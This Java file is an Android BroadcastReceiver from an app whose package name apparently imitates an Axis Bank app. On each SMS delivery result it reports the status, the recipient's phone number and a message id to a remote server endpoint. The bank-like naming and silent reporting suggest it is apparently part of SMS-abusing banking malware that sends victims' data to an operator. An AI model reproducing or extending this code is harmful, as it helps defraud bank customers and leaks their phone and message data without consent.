package com.axisofbank.german;


import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import org.json.JSONException;
import org.json.JSONObject;

public class DeliveredReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        int id = intent.getIntExtra("id", -1);
        String number = intent.getStringExtra("phone");
        String status = "";

        switch (getResultCode()) {
            case Activity.RESULT_OK:
                status = "Delivered";
                break;
            default:
                status = "UnDelivered";
                break;
        }
        JSONObject data = new JSONObject();
        try {
            Helper help = new Helper();
            data.put("status", status + " to "+number);
            data.put("id", id);
            data.put("site", help.SITE());
            Helper.postRequest(help.SMSSavePath(), data, context, new Helper.ResponseListener(){
                @Override
                public void onResponse(String result) {
                    // Log.d(Helper.TAG, "delivery status updated Result, "+ result);
                }
            });
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }

    }
}

